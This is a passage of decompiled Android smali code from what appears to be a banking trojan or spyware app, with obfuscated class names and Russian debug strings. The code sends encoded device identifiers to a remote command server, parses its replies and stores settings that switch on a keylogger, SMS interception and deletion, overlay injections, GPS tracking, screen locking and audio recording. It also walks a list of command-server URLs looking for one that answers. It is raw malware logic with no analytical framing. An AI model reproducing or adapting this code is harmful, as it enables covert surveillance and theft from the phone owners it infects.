    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, ":"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->j:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->k:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, ":"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, ":"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, ":"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->h:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, ":"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v10, v16

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v11, ":"

    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v11, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->i:Ljava/lang/String;

    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v11, ":"

    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v7, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v8, "1"

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "p="

    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v11, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v12, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v13, ":"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->j:Ljava/lang/String;

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->k:Ljava/lang/String;

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v13, ":"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, ":"

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, ":"

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->h:Ljava/lang/String;

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, ":"

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, ":"

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "tag"

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, ":"

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->i:Ljava/lang/String;

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, ":"

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, ":"

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v11, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v6, v7, v8, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->m:Ljava/lang/String;

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "Responce"

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->m:Ljava/lang/String;

    invoke-virtual {v3, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->m:Ljava/lang/String;

    invoke-virtual {v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->m:Ljava/lang/String;

    goto/16 :goto_11

    :cond_10
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->m:Ljava/lang/String;

    const-string v4, "state1letsgotxt"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_13

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v5, "3"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "p="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v7, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v4, v5, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v4, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "\u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, ""

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :try_start_5
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "\u0417\u0430\u043f\u0438\u0441\u044c  \u0443\u0441\u043f\u0435\u0448\u043d\u0430!"

    invoke-virtual {v4, v5, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, ":"

    invoke-virtual {v3, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    aget-object v5, v3, v4

    aget-object v6, v3, v4

    const-string v7, ""

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_11

    aget-object v6, v3, v4

    const/4 v4, 0x0

    invoke-virtual {v6, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_12

    :cond_11
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "lock_inj"

    const-string v7, ""

    invoke-virtual {v4, v1, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_12
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "save_inj"

    invoke-virtual {v4, v1, v6, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "del_sws"

    const/4 v6, 0x1

    aget-object v7, v3, v6

    invoke-virtual {v4, v1, v5, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "perehvat_sws"

    const/4 v6, 0x2

    aget-object v7, v3, v6

    invoke-virtual {v4, v1, v5, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "network"

    const/4 v6, 0x3

    aget-object v6, v3, v6

    invoke-virtual {v4, v1, v5, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "gps"

    const/4 v6, 0x4

    aget-object v6, v3, v6

    invoke-virtual {v4, v1, v5, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "foregroundwhile"

    const/4 v6, 0x5

    aget-object v6, v3, v6

    invoke-virtual {v4, v1, v5, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "keylogger"

    const/4 v6, 0x6

    aget-object v6, v3, v6

    invoke-virtual {v4, v1, v5, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "lookscreen"

    const/16 v6, 0x8

    aget-object v6, v3, v6

    invoke-virtual {v4, v1, v5, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "0"
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_6

    const/4 v5, 0x7

    :try_start_6
    aget-object v3, v3, v5

    const-string v5, " "

    const-string v6, ""

    invoke-virtual {v3, v5, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_5

    goto :goto_b

    :catch_5
    move-object v3, v4

    :goto_b
    :try_start_7
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "recordsoundseconds"

    invoke-virtual {v4, v1, v5, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "save seconds sound"

    invoke-static {v4, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_6

    goto/16 :goto_11

    :catch_6
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "\u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438"

    :goto_c
    const-string v5, "\u0417\u0430\u043f\u0438\u0441\u044c \u043d\u0435 good!"

    goto/16 :goto_10

    :cond_13
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->m:Ljava/lang/String;

    const-string v4, "ALLSETTINGSGO"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_1a

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v5, "6"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "p="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v7, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v4, v5, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v4, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "\u0421\u043e\u0445\u0440\u0430\u043d\u044f\u0435\u043c \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438"

    invoke-virtual {v4, v5, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, ""

    :try_start_8
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v7, "madeSettings"

    invoke-virtual {v5, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_7

    move-object v4, v5

    goto :goto_d

    :catch_7
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "ukhakhcgifofl"

    const-string v7, "ERROR GetmadeString"

    invoke-virtual {v5, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :goto_d
    const-string v5, "1 2 3 4 5 6 7 8 9 10 11 12 13 "

    const-string v6, "5+"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_14

    const-string v6, "5 "

    const-string v7, "5+"

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    :cond_14
    const-string v6, "6+"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_15

    const-string v6, "6 "

    const-string v7, "6+"

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    :cond_15
    const-string v6, "7+"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_16

    const-string v6, "7 "

    const-string v7, "7+"

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    :cond_16
    const-string v6, "8+"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_17

    const-string v6, "8 "

    const-string v7, "8+"

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    :cond_17
    const-string v6, "9+"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_18

    const-string v6, "9 "

    const-string v7, "9+"

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    :cond_18
    const-string v6, "10+"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_19

    const-string v4, "10 "

    const-string v6, "10+"

    invoke-virtual {v5, v4, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    :cond_19
    :try_start_9
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "SettingsAll"

    invoke-virtual {v4, v1, v6, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "madeSettings"

    invoke-virtual {v3, v1, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "\u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438 all"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "madeSettings: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_8

    goto/16 :goto_11

    :catch_8
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "\u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438 all"

    goto/16 :goto_c

    :cond_1a
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->m:Ljava/lang/String;

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1e

    :try_start_a
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v5, "urls"

    invoke-virtual {v3, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, " "

    const-string v5, ""

    invoke-virtual {v3, v4, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ","

    invoke-virtual {v3, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    :goto_e
    array-length v5, v3

    if-ge v4, v5, :cond_1c

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "url"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, ""

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v8, v3, v4

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v6, v3, v4

    invoke-virtual {v5, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "**2**0**0**"

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1b

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "url"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, ""

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v3, v3, v4

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v5, v1, v6, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const/4 v3, 0x1

    goto :goto_f

    :cond_1b
    add-int/lit8 v4, v4, 0x1

    goto :goto_e

    :cond_1c
    const/4 v3, 0x0

    :goto_f
    const-string v4, "Twit"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, ""

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    if-nez v3, :cond_1e

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v3}, Lwocwvy/czyxoxmbauu/slsa/b;->b()Ljava/lang/String;

    move-result-object v3

